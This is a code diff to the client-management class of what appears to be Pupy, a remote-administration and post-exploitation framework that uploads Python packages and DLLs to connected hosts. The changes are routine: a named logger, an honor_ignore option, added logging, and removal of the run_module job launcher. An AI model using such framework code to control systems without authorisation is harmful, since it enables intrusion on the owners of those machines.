@@ -37,6 +37,8 @@ from pupylib.utils.rpyc_utils import obtain
 
 ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
 
+logger = logging.getLogger('client')
+
 class PupyClient(object):
     def __init__(self, desc, pupsrv):
         self.desc = {
@@ -203,7 +205,7 @@ class PupyClient(object):
             ])
 
         except Exception as e:
-            logging.error(e)
+            logger.error(e)
         return False
 
     def remote(self, module, function=None, need_obtain=True):
@@ -431,7 +433,7 @@ class PupyClient(object):
 
         return invalidated
 
-    def load_package(self, requirements, force=False, remote=False, new_deps=[]):
+    def load_package(self, requirements, force=False, remote=False, new_deps=[], honor_ignore=True):
         try:
             forced = None
             if force:
@@ -439,7 +441,7 @@ class PupyClient(object):
 
             packages, contents, dlls = dependencies.package(
                 requirements, self.platform, self.arch, remote=remote,
-                posix=self.is_posix(),
+                posix=self.is_posix(), honor_ignore=honor_ignore,
                 filter_needed_cb=lambda modules, dll: self.filter_new_modules(
                     modules, dll, forced, remote
                 )
@@ -451,6 +453,11 @@ class PupyClient(object):
             raise ValueError('Module not found: {}'.format(e))
 
         if remote:
+            logger.info('load_package({}) -> p:{} d:{}'.format(
+                requirements,
+                len(packages) if packages else None,
+                len(dlls) if dlls else None))
+
             return packages, dlls
 
         if not contents and not dlls:
@@ -473,7 +480,7 @@ class PupyClient(object):
         if forced:
             self.invalidate_packages(forced)
 
-        logging.info('Upload packages bundle, size={}'.format(len(packages)))
+        logger.info('Upload packages bundle, size={}'.format(len(packages)))
         self.remote_add_package(
             packages,
             compressed=True,
@@ -491,36 +498,17 @@ class PupyClient(object):
             self.remote_invalidate_module(module_name)
 
     def remote_load_package(self, module_name):
-        logging.debug('remote_load_package for {} started'.format(module_name))
+        logger.debug('remote_load_package for {} started'.format(module_name))
 
         try:
             return self.load_package(module_name, remote=True)
 
         except dependencies.NotFoundError:
-            logging.debug('remote_load_package for {} failed'.format(module_name))
+            logger.debug('remote_load_package for {} failed'.format(module_name))
             return None, None
 
         finally:
-            logging.debug('remote_load_package for {} completed'.format(module_name))
-
+            logger.debug('remote_load_package for {} completed'.format(module_name))
 
     def remote_print_error(self, msg):
         self.pupsrv.handler.display_warning(msg)
-
-    def run_module(self, module_name, args):
-        """ start a module on this unique client and return the corresponding job """
-        module_name=self.pupsrv.get_module_name_from_category(module_name)
-        mod=self.pupsrv.get_module(module_name)
-        if not mod:
-            raise Exception("unknown module %s !"%modargs.module)
-        pj=None
-        modjobs=[x for x in self.pupsrv.jobs.itervalues() if x.pupymodules[0].get_name() == mod.get_name() and x.pupymodules[0].client==self]
-        if mod.daemon and mod.unique_instance and modjobs:
-            pj=modjobs[0]
-        else:
-            pj=PupyJob(self.pupsrv,"%s %s"%(module_name, args))
-            ps=mod(self, pj)
-            pj.add_module(ps)
-            self.pupsrv.add_job(pj)
-        pj.start(args)
-        return pj
